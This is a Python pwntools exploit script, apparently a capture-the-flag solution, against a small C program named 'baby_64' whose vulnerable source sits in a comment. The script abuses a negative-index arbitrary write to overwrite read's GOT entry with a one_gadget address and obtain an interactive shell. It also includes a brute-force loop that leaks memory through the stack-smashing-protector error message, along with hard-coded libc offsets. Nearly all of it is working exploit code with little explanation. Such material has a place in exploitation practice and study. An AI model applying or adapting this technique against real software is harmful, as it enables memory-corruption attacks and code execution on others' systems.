#! /usr/bin/python

from pwn import *

# Stack Smashing Protection (SSP) info leak to find out which libc is used on server
# then overwriting read_got with one_gadget

# More about Stack Smashing Protection info leak:
# http://seclists.org/bugtraq/2010/Apr/243
# https://www.youtube.com/watch?v=wLsckMfScOg

'''
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>

char asdf[1024];

int main()
{
	long long index = 0;

	alarm(5);
	read(0, &index, 1024);
	read(0, asdf+index, 8);  # => can write into any address - we going to write one_gadget into read_got 
	read(0, &index, 1024);
}

gcc baby.c -o baby_64

Stack:    Canary found
NX:       NX enabled
'''

# SSP info leak
def leak():
    for i in xrange(0x00007ffff7ffe000, 0x00007fffffffffff, 0x0000000000000008): 
        s = process('./baby_64')   
        s.sendline('1')
        s.sendline('AAAA')

        s.sendline('B' * 248 + p64(i))

        result = s.recvline()
        #print 'result = ', result

        beg = result.find('***: ') + 5
        end = result.find(' terminated')

        leak = result[beg:end]
        print 'addr =', hex(i) + ' ,leak =', leak

        s.close()

#leak()

s = process('./baby_64')

#0000000000601028 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
read_got = 0x601028
buf_addr = 0x601080

# gdb-peda$ telescope 0x601028
# 0000| 0x601028 --> 0x7ffff7b04250 (<read>:	)
# gdb magic => read_offset = 0xf7250
# libc_base = 0x7ffff7b04250 - 0xf7250 = 0x7FFFF7A0D000

# offset = 0x601080 - 0x601028 = 0x58 => i = -0x58 => i = 0xffffffffffffffa8
s.sendline(p64(0xffffffffffffffa8))

'''
gdb.attach(s, """
b * main+63
b * main+73
b * main+103
""")
'''

# one_gadget_addr = 0x7FFFF7A0D000 + 0x45216 = 0x7FFFF7A52216
# one_gadget_addr = 0x7FFFF7A0D000 + 0x4526a = 0x7FFFF7A5226A
# one_gadget_addr = 0x7FFFF7A0D000 + 0xf02a4 = 0x7FFFF7AFD2A4
# one_gadget_addr = 0x7FFFF7A0D000 + 0xf1147 = 0x7FFFF7AFE147
# tried all 4 - worked only last one

#0x7ffff7b04250 => 
#0x7ffff7afe147
s.send('\x47\xe1\xaf')

s.interactive()





